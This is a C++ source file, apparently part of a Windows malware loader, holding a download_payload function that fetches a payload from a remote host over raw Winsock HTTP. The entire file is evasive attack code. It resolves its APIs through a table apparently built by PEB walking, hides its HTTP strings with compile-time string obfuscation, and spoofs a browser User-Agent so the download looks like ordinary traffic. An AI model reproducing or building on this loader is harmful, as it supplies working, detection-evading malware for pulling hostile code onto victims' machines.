#include "network.h"
#include "peb_walk.h"
#include "obfstr.h"
#include <cstdio>
#include <cstring>
#include <cstdlib>

unsigned char* download_payload(const char* host, const char* port, const char* resource, size_t* out_size) {
    *out_size = 0;

    WSADATA wsadata = {};
    int ret = g_apis.pWSAStartup(MAKEWORD(2, 2), &wsadata);
    if (ret != 0) return nullptr;

    ADDRINFOA hints = {};
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    PADDRINFOA result = nullptr;
    ret = g_apis.pGetaddrinfo(host, port, &hints, &result);
    if (ret != 0 || !result) {
        g_apis.pWSACleanup();
        return nullptr;
    }

    SOCKET sock = g_apis.pSocket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (sock == INVALID_SOCKET) {
        g_apis.pFreeaddrinfo(result);
        g_apis.pWSACleanup();
        return nullptr;
    }

    ret = g_apis.pConnect(sock, result->ai_addr, static_cast<int>(result->ai_addrlen));
    g_apis.pFreeaddrinfo(result);

    if (ret != 0) {
        g_apis.pClosesocket(sock);
        g_apis.pWSACleanup();
        return nullptr;
    }

    auto method = OBFSTR("GET /");
    auto http_ver = OBFSTR(" HTTP/1.1\r\nHost: ");
    auto ua_hdr = OBFSTR("\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
    auto accept_hdr = OBFSTR("\r\nAccept: */*\r\nConnection: close\r\n\r\n");

    char request[2048] = {};
    snprintf(request, sizeof(request), "%s%s%s%s%s%s",
        method.c_str(), resource, http_ver.c_str(), host,
        ua_hdr.c_str(), accept_hdr.c_str());

    size_t req_len = strlen(request);
    ret = g_apis.pSend(sock, request, static_cast<int>(req_len), 0);
    if (ret <= 0) {
        g_apis.pClosesocket(sock);
        g_apis.pWSACleanup();
        return nullptr;
    }

    size_t buf_capacity = 1024 * 1024;
    unsigned char* buf = reinterpret_cast<unsigned char*>(malloc(buf_capacity));
    if (!buf) {
        g_apis.pClosesocket(sock);
        g_apis.pWSACleanup();
        return nullptr;
    }

    size_t total_received = 0;
    bool header_parsed = false;
    size_t body_offset = 0;

    while (true) {
        fd_set readfds;
        FD_ZERO(&readfds);
        FD_SET(sock, &readfds);

        struct timeval tv;
        tv.tv_sec = 10;
        tv.tv_usec = 0;

        ret = g_apis.pSelect(0, &readfds, nullptr, nullptr, &tv);
        if (ret <= 0) break;

        if (total_received + 8192 > buf_capacity) {
            buf_capacity *= 2;
            unsigned char* new_buf = reinterpret_cast<unsigned char*>(realloc(buf, buf_capacity));
            if (!new_buf) {
                free(buf);
                g_apis.pClosesocket(sock);
                g_apis.pWSACleanup();
                return nullptr;
            }
            buf = new_buf;
        }

        int received = g_apis.pRecv(sock, reinterpret_cast<char*>(buf + total_received), 8192, 0);
        if (received <= 0) break;
        total_received += received;
    }

    g_apis.pClosesocket(sock);
    g_apis.pWSACleanup();

    if (total_received == 0) {
        free(buf);
        return nullptr;
    }

    for (size_t i = 0; i + 3 < total_received; i++) {
        if (buf[i] == '\r' && buf[i+1] == '\n' && buf[i+2] == '\r' && buf[i+3] == '\n') {
            body_offset = i + 4;
            header_parsed = true;
            break;
        }
    }

    if (!header_parsed) body_offset = 0;

    size_t body_size = total_received - body_offset;
    if (body_size == 0) {
        free(buf);
        return nullptr;
    }

    if (body_offset > 0) {
        memmove(buf, buf + body_offset, body_size);
    }

    *out_size = body_size;
    return buf;
}
